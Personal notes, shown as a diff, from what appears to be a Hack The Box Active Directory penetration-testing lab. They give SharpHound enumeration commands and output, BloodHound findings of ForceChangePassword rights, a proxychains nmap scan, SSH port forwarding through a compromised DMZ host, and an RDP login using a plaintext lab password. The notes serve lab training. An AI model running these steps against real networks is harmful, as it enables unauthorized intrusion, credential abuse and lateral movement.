@@ -2,6 +2,66 @@
 Stoppign here on 02/24 jsut copying anythign down that maybe needed for tomrorow: 
 
 
+
+
+Use SharpHoune to enumerate AD -> 
+
+SYNTAX: c:\DotNetNuke\Portals\0> SharpHound.exe -c All
+
+2022-06-22T10:02:32.2363320-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-06-22T10:02:32.2519575-07:00|INFORMATION|Initializing SharpHound at 10:02 AM on 6/22/2022
+2022-06-22T10:02:32.5800848-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-06-22T10:02:32.7675820-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
+2022-06-22T10:03:03.3301538-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 46 MB RAM
+2022-06-22T10:03:16.9238698-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
+2022-06-22T10:03:18.1426009-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2022-06-22T10:03:18.1582366-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2022-06-22T10:03:18.6738528-07:00|INFORMATION|Consumers finished, closing output channel
+2022-06-22T10:03:18.7050961-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2022-06-22T10:03:18.8769905-07:00|INFORMATION|Status: 3641 objects finished (+3641 79.15218)/s -- Using 76 MB RAM
+2022-06-22T10:03:18.8769905-07:00|INFORMATION|Enumeration finished in 00:00:46.1149865
+2022-06-22T10:03:19.1582443-07:00|INFORMATION|SharpHound Enumeration Completed at 10:03 AM on 6/22/2022! Happy Graphing! 
+
+
+This will generate a tidy Zip file that we can download via the DNN file management tool again (so convenient!). Next, we can start the neo4j service (sudo neo4j start), type bloodhound to open the GUI tool, and ingest the data.
+
+Searching for our user hporter and selecting First Degree Object Control, we can see that the user has ForceChangePassword rights over the ssmalls user.
+
+
+As an aside, we can see that all Domain Users have RDP access over the DEV01 host. This means that any user in the domain can RDP in and, if they can escalate privileges, could potentially steal sensitive data such as credentials. This is worth noting as a finding; we can call it Excessive Active Directory Group Privileges and label it medium-risk. If the entire group had local admin rights over a host, it would definitely be a high-risk finding.
+We can use PowerView to change the ssmalls user's password. Let's RDP to the target after checking to ensure the port is open. RDP will make it easier for us to interact with the domain via a PowerShell console, though we could still do this via our reverse shell access.
+
+
+SYNTAX: MJBUCKNER@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 13:35 EDT
+|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:80-<><>-OK
+|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:3389-<><>-OK
+Nmap scan report for 172.16.8.20
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds 
+
+To achieve this, we can use another SSH port forwarding command, this type Local Port Forwarding. The command allows us to pass all RDP traffic to DEV01 through the dmz01 host via local port 13389.
+
+Syntax: ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111 
+
+Syntax: xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools" 
+
+
+
+
+
+
+
+
+
+
 looks like were gonna need to copy printspoofer over again and run all the steps from yesterday again so ill jsut copy and paste from yesterdayss lesson: 
 
 
